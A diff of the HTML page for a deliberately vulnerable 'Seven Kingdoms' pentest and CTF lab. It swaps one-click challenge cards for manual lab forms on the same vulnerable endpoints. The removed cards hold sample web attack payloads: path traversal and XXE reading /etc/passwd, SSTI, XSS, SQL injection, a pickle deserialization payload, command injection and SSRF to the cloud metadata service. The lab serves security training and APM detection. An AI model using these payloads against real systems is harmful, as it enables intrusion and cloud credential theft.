@@ -3,17 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Seven Kingdoms CTF — Vulnerable Application</title>
+  <title>Seven Kingdoms Portal — Penetration Testing Lab</title>
   <meta name="generator" content="OCI-DEMO">
   <link rel="stylesheet" href="/static/vulnerable.css">
-
-  <!-- OpenTelemetry Web SDK -->
-  <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/api@1.4.1/build/src/index.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/sdk-trace-web@1.15.0/build/src/index.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/exporter-trace-otlp-http@0.41.1/build/src/index.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/context-zone@1.15.0/build/src/index.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/instrumentation@0.41.1/build/src/index.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@opentelemetry/instrumentation-fetch@0.41.1/build/src/index.js"></script>
 
   <!-- OCI APM RUM Agent -->
   <script>
@@ -33,900 +25,1092 @@
     <span class="brand-name">Seven Kingdoms</span>
   </a>
   <div class="nav-links">
-    <a href="#" data-tab="challenges" class="active">Challenges</a>
-    <a href="#" data-tab="ux-scenarios">UX Scenarios</a>
-    <a href="#" data-tab="walkthrough">Walkthrough</a>
-    <a href="#" data-tab="scoreboard">Scoreboard</a>
+    <a href="#" data-tab="lab" class="active">Practice Lab</a>
+    <a href="#" data-tab="guide">Pentest Guide</a>
+    <a href="#" data-tab="traces">APM Traces</a>
   </div>
   <div class="nav-right">
-    <span class="badge badge-otel">OTel Instrumented</span>
-    <a href="/portal/" class="portal-link">Open Portal</a>
+    <span id="session-indicator" class="session-badge">Not Authenticated</span>
+    <a href="/portal/" class="portal-link">Portal Home</a>
   </div>
 </nav>
 
-<!-- ── Page Content ─────────────────────────────── -->
-<div class="page">
-  <div class="page-header">
-    <h1 class="page-title">Seven Kingdoms CTF</h1>
-    <p class="page-subtitle">Capture the flags hidden across 30+ vulnerable endpoints. Every attack generates OpenTelemetry traces for OCI APM detection.</p>
-  </div>
-
-  <!-- Live Metrics -->
-  <div class="live-metrics">
-    <div class="live-metric">
-      <div class="value" id="metric-requests">0</div>
-      <div class="label">Requests</div>
-    </div>
-    <div class="live-metric">
-      <div class="value error" id="metric-errors" style="color:var(--error)">0</div>
-      <div class="label">Errors</div>
-    </div>
-    <div class="live-metric">
-      <div class="value" id="metric-avg-latency">0ms</div>
-      <div class="label">Avg Latency</div>
-    </div>
-    <div class="live-metric">
-      <div class="value" id="metric-apdex" style="color:var(--success)">1.00</div>
-      <div class="label">Apdex</div>
-    </div>
-  </div>
-
-  <!-- ═══ TAB: CHALLENGES ═══ -->
-  <div class="tab-panel active" id="tab-challenges">
-
-    <!-- Stats Overview -->
-    <div class="stats-bar">
-      <div class="stat-box"><div class="stat-label">Total Challenges</div><div class="stat-value">10</div></div>
-      <div class="stat-box"><div class="stat-label">Flags Captured</div><div class="stat-value success" id="flags-captured">0</div></div>
-      <div class="stat-box"><div class="stat-label">OWASP Categories</div><div class="stat-value info">8</div></div>
-      <div class="stat-box"><div class="stat-label">GOAD Targets</div><div class="stat-value" style="color:var(--purple)">3</div></div>
-      <div class="stat-box"><div class="stat-label">OTel Spans</div><div class="stat-value info" id="otel-spans">0</div></div>
-      <div class="stat-box"><div class="stat-label">Difficulty</div><div class="stat-value" style="color:var(--warning)">Mixed</div></div>
+<!-- ══════════════════════════════════════════════ -->
+<!-- Practice Lab Tab                                -->
+<!-- ══════════════════════════════════════════════ -->
+<div id="tab-lab" class="tab-panel active">
+  <div class="page">
+    <div class="page-header">
+      <h1 class="page-title">Penetration Testing Lab</h1>
+      <p class="page-subtitle">Interact with the forms below to discover and exploit vulnerabilities. No automated attacks — use your skills.</p>
     </div>
 
-    <!-- Web Application Attacks -->
-    <div class="section-header">
-      <h2 class="section-title">Web Application Attacks</h2>
-      <button class="btn-run-all" onclick="runAllChallenges()">&#9889; Run All</button>
-    </div>
-    <div class="challenges-grid">
-
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/ctf/orders/1002', this, 'idor')">
-        <div class="card-top">
-          <span class="card-icon">&#128373;</span>
+    <div class="lab-grid">
+      <!-- ── Authentication Module ──────────────────── -->
+      <div class="module-card" id="mod-auth">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#128274;</span>
+            <h3>Authentication</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-high">High</span>
-            <span class="badge badge-ctf">A01</span>
+            <span class="badge badge-high">A07</span>
+            <span class="badge badge-otel">T1110</span>
           </div>
         </div>
-        <div class="card-title">Mission 1: IDOR</div>
-        <div class="card-desc">Access order #1002 belonging to another user. The server doesn't verify ownership — just change the ID parameter.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/ctf/orders/1002</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form id="frm-login" class="lab-form" data-url="/portal/api/auth/login" data-method="POST" data-content="json">
+            <div class="form-group">
+              <label>Username</label>
+              <input name="username" type="text" placeholder="e.g. admin, jon.snow" autocomplete="off">
+            </div>
+            <div class="form-group">
+              <label>Password</label>
+              <input name="password" type="password" placeholder="Password" autocomplete="off">
+            </div>
+            <div class="form-group">
+              <label>Authentication Realm</label>
+              <select name="realm">
+                <option value="local">Local Database</option>
+                <option value="sevenkingdoms.local">sevenkingdoms.local (LDAP)</option>
+                <option value="north.sevenkingdoms.local">north.sevenkingdoms.local (LDAP)</option>
+                <option value="essos.local">essos.local (LDAP)</option>
+              </select>
+            </div>
+            <button type="submit" class="form-btn">Sign In</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form id="frm-register" class="lab-form" data-url="/portal/api/auth/register" data-method="POST" data-content="json">
+            <h4 class="form-section-title">Register New Account</h4>
+            <div class="form-group">
+              <label>Username</label>
+              <input name="username" type="text" placeholder="New username" autocomplete="off">
+            </div>
+            <div class="form-group">
+              <label>Password</label>
+              <input name="password" type="password" placeholder="Choose password" autocomplete="off">
+            </div>
+            <div class="form-group">
+              <label>Email</label>
+              <input name="email" type="text" placeholder="user@sevenkingdoms.local" autocomplete="off">
+            </div>
+            <button type="submit" class="form-btn form-btn-secondary">Register</button>
+          </form>
         </div>
       </div>
 
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/ctf/render?template=../../../../etc/passwd', this, 'lfi')">
-        <div class="card-top">
-          <span class="card-icon">&#128193;</span>
+      <!-- ── User Directory Module ──────────────────── -->
+      <div class="module-card" id="mod-users">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#128100;</span>
+            <h3>User Directory</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-critical">Critical</span>
-            <span class="badge badge-ctf">A01</span>
+            <span class="badge badge-high">A01</span>
+            <span class="badge badge-otel">IDOR</span>
           </div>
         </div>
-        <div class="card-title">Mission 2: Path Traversal / LFI</div>
-        <div class="card-desc">Traverse directories with <code>../</code> sequences to read <code>/etc/passwd</code> via the template renderer.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/ctf/render?template=../../..</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url-template="/portal/api/users/{user_id}" data-method="GET">
+            <div class="form-group">
+              <label>User ID</label>
+              <input name="user_id" type="text" placeholder="e.g. 1, 2, 3..." value="1">
+            </div>
+            <button type="submit" class="form-btn">Lookup Profile</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url-template="/portal/api/ldap/lookup?username={username}" data-method="GET">
+            <h4 class="form-section-title">LDAP Directory Search</h4>
+            <div class="form-group">
+              <label>Username</label>
+              <input name="username" type="text" placeholder="e.g. jon.snow, tyrion*">
+            </div>
+            <button type="submit" class="form-btn">Search LDAP</button>
+          </form>
         </div>
       </div>
 
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/ctf/render?template={{7*7}}', this, 'ssti')">
-        <div class="card-top">
-          <span class="card-icon">&#9881;</span>
+      <!-- ── Treasury & Finance Module ──────────────── -->
+      <div class="module-card" id="mod-treasury">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#128176;</span>
+            <h3>Treasury &amp; Finance</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-critical">Critical</span>
-            <span class="badge badge-ctf">A03</span>
+            <span class="badge badge-critical">A03</span>
+            <span class="badge badge-otel">SQLi</span>
           </div>
         </div>
-        <div class="card-title">Mission 3: SSTI</div>
-        <div class="card-desc">Inject <code>{{7*7}}</code> into the Jinja2 template engine. If it returns 49, server-side template injection is confirmed.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/ctf/render?template={{7*7}}</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url-template="/portal/api/treasury/search?q={q}" data-method="GET">
+            <div class="form-group">
+              <label>Search Transactions</label>
+              <input name="q" type="text" placeholder="e.g. gold, taxes, iron...">
+            </div>
+            <button type="submit" class="form-btn">Search</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url-template="/portal/api/treasury/{id}" data-method="GET">
+            <h4 class="form-section-title">View Record</h4>
+            <div class="form-group">
+              <label>Record ID</label>
+              <input name="id" type="text" placeholder="e.g. 1, 2, 3...">
+            </div>
+            <button type="submit" class="form-btn">Fetch Record</button>
+          </form>
         </div>
       </div>
 
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/ctf/search?query=%3Cscript%3Ealert(1)%3C/script%3E', this, 'xss')">
-        <div class="card-top">
-          <span class="card-icon">&#128126;</span>
+      <!-- ── Communication Module ──────────────────── -->
+      <div class="module-card" id="mod-messages">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#128172;</span>
+            <h3>Ravens &amp; Messages</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-high">High</span>
-            <span class="badge badge-ctf">A03</span>
+            <span class="badge badge-high">A03</span>
+            <span class="badge badge-otel">XSS</span>
           </div>
         </div>
-        <div class="card-title">Mission 4: Reflected XSS</div>
-        <div class="card-desc">Inject a <code>&lt;script&gt;</code> tag via the search parameter. The server reflects it unescaped in the response.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/ctf/search?query=...</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url="/portal/api/messages/send" data-method="POST" data-content="json">
+            <div class="form-group">
+              <label>Recipient</label>
+              <input name="to" type="text" placeholder="e.g. admin, cersei" value="admin">
+            </div>
+            <div class="form-group">
+              <label>Subject</label>
+              <input name="subject" type="text" placeholder="Message subject">
+            </div>
+            <div class="form-group">
+              <label>Message Body (HTML supported)</label>
+              <textarea name="body" rows="3" placeholder="Write your message..."></textarea>
+            </div>
+            <button type="submit" class="form-btn">Send Raven</button>
+          </form>
         </div>
       </div>
 
-      <div class="challenge-card" onclick="fireChallengePost('/api/v1/ctf/xml_upload', 'application/xml', '<?xml version=\"1.0\"?><!DOCTYPE f [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><f>&xxe;</f>', this, 'xxe')">
-        <div class="card-top">
-          <span class="card-icon">&#128278;</span>
+      <!-- ── File Manager Module ───────────────────── -->
+      <div class="module-card" id="mod-files">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#128193;</span>
+            <h3>File Manager</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-critical">Critical</span>
-            <span class="badge badge-ctf">A05</span>
+            <span class="badge badge-critical">A01</span>
+            <span class="badge badge-otel">LFI</span>
           </div>
         </div>
-        <div class="card-title">Mission 5: XXE Injection</div>
-        <div class="card-desc">Submit an XML payload with an external entity that reads <code>/etc/passwd</code> from the server filesystem.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">POST /api/v1/ctf/xml_upload</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url-template="/portal/api/files/download?path={path}" data-method="GET">
+            <div class="form-group">
+              <label>File Path</label>
+              <input name="path" type="text" placeholder="e.g. reports/treasury.csv">
+            </div>
+            <button type="submit" class="form-btn">Download</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url="/portal/api/template/render" data-method="POST" data-content="json">
+            <h4 class="form-section-title">Template Renderer</h4>
+            <div class="form-group">
+              <label>Template Content</label>
+              <input name="template" type="text" placeholder="e.g. Hello {{name}}">
+            </div>
+            <button type="submit" class="form-btn">Render</button>
+          </form>
         </div>
       </div>
 
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/ctf/import_profile?payload=gASVNwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBdlY2hvIEZMQUdfSU5KRUNURUQgPiAvdG1wL3EudHh0lIWUUpQu', this, 'deserialization')">
-        <div class="card-top">
-          <span class="card-icon">&#129513;</span>
+      <!-- ── Network Tools Module ──────────────────── -->
+      <div class="module-card" id="mod-network">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#127760;</span>
+            <h3>Network Tools</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-critical">Critical</span>
-            <span class="badge badge-ctf">A08</span>
+            <span class="badge badge-critical">A10</span>
+            <span class="badge badge-otel">SSRF</span>
           </div>
         </div>
-        <div class="card-title">Mission 6: Insecure Deserialization</div>
-        <div class="card-desc">Submit a base64-encoded Python pickle payload. The server deserializes it without validation — achieving RCE.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/ctf/import_profile</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url-template="/portal/api/avatar/fetch?url={url}" data-method="GET">
+            <div class="form-group">
+              <label>Fetch URL (Avatar Import)</label>
+              <input name="url" type="text" placeholder="e.g. http://example.com/avatar.png">
+            </div>
+            <button type="submit" class="form-btn">Fetch</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url="/portal/api/webhook/send" data-method="POST" data-content="json">
+            <h4 class="form-section-title">Webhook Tester</h4>
+            <div class="form-group">
+              <label>Webhook URL</label>
+              <input name="url" type="text" placeholder="e.g. http://internal-service:8080/api">
+            </div>
+            <div class="form-group">
+              <label>Payload</label>
+              <input name="data" type="text" placeholder='{"event": "test"}' value='{"event": "test"}'>
+            </div>
+            <button type="submit" class="form-btn">Send Webhook</button>
+          </form>
         </div>
       </div>
 
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/users/search?q=%27%20OR%201%3D1%20--', this, 'sqli')">
-        <div class="card-top">
-          <span class="card-icon">&#128137;</span>
+      <!-- ── System Tools Module ───────────────────── -->
+      <div class="module-card" id="mod-system">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#9881;</span>
+            <h3>System Console</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-critical">Critical</span>
-            <span class="badge badge-ctf">A03</span>
+            <span class="badge badge-critical">A03</span>
+            <span class="badge badge-otel">RCE</span>
           </div>
         </div>
-        <div class="card-title">SQL Injection</div>
-        <div class="card-desc">Send <code>' OR 1=1 --</code> to the user search. The unsanitized input bypasses authentication and dumps the database.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/users/search?q='OR 1=1--</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url="/portal/api/command/exec" data-method="POST" data-content="json">
+            <div class="form-group">
+              <label>Diagnostic Command</label>
+              <input name="command" type="text" placeholder="e.g. hostname, uptime">
+            </div>
+            <button type="submit" class="form-btn">Execute</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url-template="/portal/api/log-injection?message={message}&level={level}" data-method="GET">
+            <h4 class="form-section-title">Application Logger</h4>
+            <div class="form-group">
+              <label>Log Message</label>
+              <input name="message" type="text" placeholder="Enter log entry...">
+            </div>
+            <div class="form-group">
+              <label>Level</label>
+              <select name="level">
+                <option value="info">INFO</option>
+                <option value="warning">WARNING</option>
+                <option value="error">ERROR</option>
+              </select>
+            </div>
+            <button type="submit" class="form-btn">Write Log</button>
+          </form>
         </div>
       </div>
 
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/system/diagnostics?cmd=id;whoami', this, 'rce')">
-        <div class="card-top">
-          <span class="card-icon">&#128026;</span>
+      <!-- ── Administration Module ─────────────────── -->
+      <div class="module-card" id="mod-admin">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#128081;</span>
+            <h3>Administration</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-critical">Critical</span>
-            <span class="badge badge-ctf">A03</span>
+            <span class="badge badge-critical">A07</span>
+            <span class="badge badge-otel">JWT</span>
           </div>
         </div>
-        <div class="card-title">Command Injection (RCE)</div>
-        <div class="card-desc">Chain OS commands with <code>;</code> or <code>|</code> via the diagnostics endpoint. Achieves remote code execution on the server.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/system/diagnostics?cmd=id;whoami</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url="/portal/api/admin/panel" data-method="GET" data-auth="jwt">
+            <div class="form-group">
+              <label>JWT Token</label>
+              <input name="_jwt_override" type="text" placeholder="Paste a JWT token or leave empty to use session" class="mono-input">
+            </div>
+            <button type="submit" class="form-btn">Access Admin Panel</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url="/portal/api/debug/crypto" data-method="GET">
+            <h4 class="form-section-title">Debug Endpoints</h4>
+            <button type="submit" class="form-btn form-btn-secondary">Crypto Config</button>
+          </form>
+
+          <form class="lab-form" data-url="/portal/api/debug/env" data-method="GET" style="margin-top:8px;">
+            <button type="submit" class="form-btn form-btn-secondary">Environment Info</button>
+          </form>
         </div>
       </div>
 
-    </div>
-
-    <!-- GOAD / Active Directory Attacks -->
-    <div class="section-header">
-      <h2 class="section-title">GOAD — Active Directory Attacks</h2>
-      <span class="badge badge-goad">Requires GOAD Lab</span>
-    </div>
-    <div class="challenges-grid">
-
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/got/wildlings?name=Tormund%27%20UNION%20SELECT%20flag%20FROM%20secrets--', this, 'goad-sqli')">
-        <div class="card-top">
-          <span class="card-icon">&#128058;</span>
+      <!-- ── GOAD Integration Module ───────────────── -->
+      <div class="module-card" id="mod-goad">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#9877;</span>
+            <h3>GOAD Active Directory</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-critical">Critical</span>
             <span class="badge badge-goad">GOAD</span>
-            <span class="badge badge-ctf">A03</span>
+            <span class="badge badge-otel">T1558</span>
           </div>
         </div>
-        <div class="card-title">Mission 7: The Wall (MSSQL Injection)</div>
-        <div class="card-desc">Extract flags from the Castelblack MSSQL database using UNION-based SQL injection against the GOAD domain.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/got/wildlings?name=...</span>
-          <span class="card-otel">&#128269; OTel + MSSQL</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url="/portal/api/goad/connectivity" data-method="GET">
+            <button type="submit" class="form-btn">Check GOAD Connectivity</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url="/api/v1/got/wildlings" data-method="GET" data-url-template="/api/v1/got/wildlings?name={name}">
+            <h4 class="form-section-title">Castle Black DB Query</h4>
+            <div class="form-group">
+              <label>Wildling Name</label>
+              <input name="name" type="text" placeholder="e.g. Tormund" value="Tormund">
+            </div>
+            <button type="submit" class="form-btn">Search</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url-template="/api/v1/got/dragons?url={url}" data-method="GET">
+            <h4 class="form-section-title">Dragon Egg Tracker</h4>
+            <div class="form-group">
+              <label>Data Source URL</label>
+              <input name="url" type="text" placeholder="http://meereen.essos.local/api/dragon_locations" value="http://meereen.essos.local/api/dragon_locations">
+            </div>
+            <button type="submit" class="form-btn">Fetch Data</button>
+          </form>
         </div>
       </div>
 
-      <div class="challenge-card" onclick="fireChallenge('/api/v1/got/dragons?url=http://169.254.169.254/opc/v2/instance/', this, 'ssrf')">
-        <div class="card-top">
-          <span class="card-icon">&#128009;</span>
+      <!-- ── Data Import Module ────────────────────── -->
+      <div class="module-card" id="mod-import">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#128230;</span>
+            <h3>Data Import</h3>
+          </div>
           <div class="card-badges">
-            <span class="badge badge-critical">Critical</span>
-            <span class="badge badge-goad">GOAD</span>
-            <span class="badge badge-ctf">A10</span>
+            <span class="badge badge-critical">A08</span>
+            <span class="badge badge-otel">Deser</span>
           </div>
         </div>
-        <div class="card-title">Mission 8: Dragon Eggs (SSRF)</div>
-        <div class="card-desc">Exploit SSRF to reach the OCI Instance Metadata Service (IMDS) at <code>169.254.169.254</code> and steal cloud credentials.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /api/v1/got/dragons?url=...</span>
-          <span class="card-otel">&#128269; OTel</span>
+
+        <div class="module-body">
+          <form class="lab-form" data-url-template="/portal/api/import/profile?payload={payload}" data-method="GET">
+            <div class="form-group">
+              <label>Import Profile (Base64)</label>
+              <input name="payload" type="text" placeholder="Base64-encoded profile data" class="mono-input">
+            </div>
+            <button type="submit" class="form-btn">Import</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url="/portal/api/import/json" data-method="POST" data-content="json">
+            <h4 class="form-section-title">JSON Config Import</h4>
+            <div class="form-group">
+              <label>JSON Data</label>
+              <textarea name="data" rows="3" placeholder='{"name": "config", "type": "settings"}' class="mono-input"></textarea>
+            </div>
+            <button type="submit" class="form-btn">Import JSON</button>
+          </form>
         </div>
       </div>
 
+      <!-- ── Redirect & Misc Module ────────────────── -->
+      <div class="module-card" id="mod-misc">
+        <div class="module-header">
+          <div class="module-title-row">
+            <span class="module-icon">&#128279;</span>
+            <h3>External Links</h3>
+          </div>
+          <div class="card-badges">
+            <span class="badge badge-medium">A01</span>
+          </div>
+        </div>
+
+        <div class="module-body">
+          <form class="lab-form" data-url-template="/portal/api/redirect?url={url}" data-method="GET" data-follow="false">
+            <div class="form-group">
+              <label>Redirect URL</label>
+              <input name="url" type="text" placeholder="e.g. https://sevenkingdoms.local/portal">
+            </div>
+            <button type="submit" class="form-btn">Follow Link</button>
+          </form>
+
+          <div class="module-divider"></div>
+
+          <form class="lab-form" data-url="/portal/api/detection-rules" data-method="GET">
+            <h4 class="form-section-title">Detection Rules API</h4>
+            <button type="submit" class="form-btn form-btn-secondary">View Detection Rules</button>
+          </form>
+        </div>
+      </div>
     </div>
 
-    <!-- UX Degradation Quick Access -->
-    <div class="section-header">
-      <h2 class="section-title">UX Degradation Scenarios</h2>
-      <span class="badge badge-otel">APM Traces</span>
-    </div>
-    <div class="challenges-grid">
-
-      <div class="challenge-card" onclick="fireChallenge('/app/slow-query', this, 'ux')">
-        <div class="card-top">
-          <span class="card-icon">&#128012;</span>
-          <div class="card-badges"><span class="badge badge-medium">Warning</span></div>
-        </div>
-        <div class="card-title">Slow Database Query</div>
-        <div class="card-desc">Simulates a 2-30s DB query delay. Generates APM span with duration exceeding the 5s threshold.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /app/slow-query</span>
-          <span class="card-otel">&#128269; APM Duration</span>
-        </div>
-      </div>
-
-      <div class="challenge-card" onclick="fireChallenge('/app/error-page', this, 'ux')">
-        <div class="card-top">
-          <span class="card-icon">&#128165;</span>
-          <div class="card-badges"><span class="badge badge-high">Error</span></div>
-        </div>
-        <div class="card-title">Application Error (500)</div>
-        <div class="card-desc">Triggers an unhandled NullPointerException. Generates error span with stack trace in OCI Logging.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /app/error-page</span>
-          <span class="card-otel">&#128269; Error Span</span>
-        </div>
-      </div>
-
-      <div class="challenge-card" onclick="fireChallenge('/app/cascade-failure', this, 'ux')">
-        <div class="card-top">
-          <span class="card-icon">&#128279;</span>
-          <div class="card-badges"><span class="badge badge-critical">Critical</span></div>
-        </div>
-        <div class="card-title">Cascade Failure (503)</div>
-        <div class="card-desc">Upstream payment-service unavailable. Circuit breaker OPEN state. Generates multiple error spans in trace waterfall.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /app/cascade-failure</span>
-          <span class="card-otel">&#128269; Circuit Breaker</span>
-        </div>
-      </div>
-
-      <div class="challenge-card" onclick="fireChallenge('/app/hard-load', this, 'ux')">
-        <div class="card-top">
-          <span class="card-icon">&#128230;</span>
-          <div class="card-badges"><span class="badge badge-medium">Warning</span></div>
-        </div>
-        <div class="card-title">Heavy Page Load (~1MB)</div>
-        <div class="card-desc">Returns massive HTML payload. RUM shows LCP &gt;4s with blank screen during render. Visible in APM Browser agent.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /app/hard-load</span>
-          <span class="card-otel">&#128269; RUM / LCP</span>
-        </div>
-      </div>
-
-      <div class="challenge-card" onclick="fireChallenge('/app/timeout', this, 'ux')">
-        <div class="card-top">
-          <span class="card-icon">&#9201;</span>
-          <div class="card-badges"><span class="badge badge-critical">Critical</span></div>
-        </div>
-        <div class="card-title">Request Timeout (30s+)</div>
-        <div class="card-desc">Request hangs for 35 seconds. No response span is generated because the request times out before completion.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /app/timeout</span>
-          <span class="card-otel">&#128269; Timeout</span>
-        </div>
-      </div>
-
-      <div class="challenge-card" onclick="fireChallenge('/app/memory-pressure', this, 'ux')">
-        <div class="card-top">
-          <span class="card-icon">&#129504;</span>
-          <div class="card-badges"><span class="badge badge-medium">Warning</span></div>
-        </div>
-        <div class="card-title">Memory Pressure / GC Pause</div>
-        <div class="card-desc">Simulates GC pause (500ms-5s) with heap at 70-95% capacity. Observable in APM as latency spikes.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /app/memory-pressure</span>
-          <span class="card-otel">&#128269; GC Metrics</span>
-        </div>
-      </div>
-
-      <div class="challenge-card" onclick="fireChallenge('/app/intermittent-error', this, 'ux')">
-        <div class="card-top">
-          <span class="card-icon">&#127922;</span>
-          <div class="card-badges"><span class="badge badge-high">Error</span></div>
-        </div>
-        <div class="card-title">Intermittent Error (50%)</div>
-        <div class="card-desc">Random 50% failure rate. Connection reset by peer. Simulates a flaky upstream service — hard to diagnose without tracing.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /app/intermittent-error</span>
-          <span class="card-otel">&#128269; Error Rate</span>
-        </div>
-      </div>
-
-      <div class="challenge-card" onclick="fireChallenge('/app/bad-gateway', this, 'ux')">
-        <div class="card-top">
-          <span class="card-icon">&#128683;</span>
-          <div class="card-badges"><span class="badge badge-high">Error</span></div>
-        </div>
-        <div class="card-title">Bad Gateway (502)</div>
-        <div class="card-desc">Upstream inventory-service returns invalid response. Generates 502 error span visible in APM trace waterfall.</div>
-        <div class="card-footer">
-          <span class="card-endpoint">GET /app/bad-gateway</span>
-          <span class="card-otel">&#128269; 502 Span</span>
-        </div>
-      </div>
-
-    </div>
-
-    <!-- Response Panel -->
-    <div class="response-panel" id="response-panel">
+    <!-- ── Response Inspector ─────────────────────── -->
+    <div id="response-panel" class="response-panel visible">
       <div class="response-header">
-        <h3>Response</h3>
+        <h3>Response Inspector</h3>
         <div class="response-meta">
+          <span id="resp-method" class="resp-tag">-</span>
+          <span id="resp-url" class="resp-url">-</span>
           <span class="status-dot" id="resp-dot"></span>
-          <span id="resp-status"></span>
-          <span id="resp-latency"></span>
+          <span id="resp-status">-</span>
+          <span id="resp-time" class="resp-time">-</span>
+          <button id="resp-clear" class="resp-clear-btn" onclick="clearResponse()">Clear</button>
         </div>
       </div>
       <div class="response-body">
-        <pre id="resp-content">Click a challenge to see the response...</pre>
+        <pre id="resp-output">Submit a form above to see the HTTP response here.
+
+This panel shows raw responses from the server — use it to analyze
+the application's behavior, discover data leaks, error messages,
+and hidden information that can be used for exploitation.</pre>
       </div>
-      <div class="flag-banner" id="flag-banner" style="display:none"></div>
+      <div id="resp-flags" class="flag-banner" style="display:none;"></div>
+    </div>
+
+    <!-- ── Request History ────────────────────────── -->
+    <div id="history-panel" class="history-panel">
+      <div class="history-header" onclick="toggleHistory()">
+        <h3>Request History <span id="history-count">(0)</span></h3>
+        <span class="chevron" id="history-chevron">&#9660;</span>
+      </div>
+      <div id="history-body" class="history-body">
+        <table class="history-table">
+          <thead>
+            <tr><th>Time</th><th>Method</th><th>Endpoint</th><th>Status</th><th>Duration</th><th></th></tr>
+          </thead>
+          <tbody id="history-rows"></tbody>
+        </table>
+      </div>
     </div>
   </div>
+</div>
 
-  <!-- ═══ TAB: UX SCENARIOS ═══ -->
-  <div class="tab-panel" id="tab-ux-scenarios">
-    <div class="section-header">
-      <h2 class="section-title">UX Degradation Simulation</h2>
-      <span class="badge badge-otel">Digital Experience Monitoring</span>
+<!-- ══════════════════════════════════════════════ -->
+<!-- Pentest Guide Tab                               -->
+<!-- ══════════════════════════════════════════════ -->
+<div id="tab-guide" class="tab-panel">
+  <div class="page">
+    <div class="page-header">
+      <h1 class="page-title">Pentest Guide</h1>
+      <p class="page-subtitle">Attack surface map, methodology, and hints for the Seven Kingdoms Portal.</p>
     </div>
-    <p style="color:var(--text-secondary);margin-bottom:24px">These scenarios simulate real-world application performance problems. Each one generates specific APM traces and metrics that can be detected using OCI APM Trace Explorer and OCI Monitoring alarms.</p>
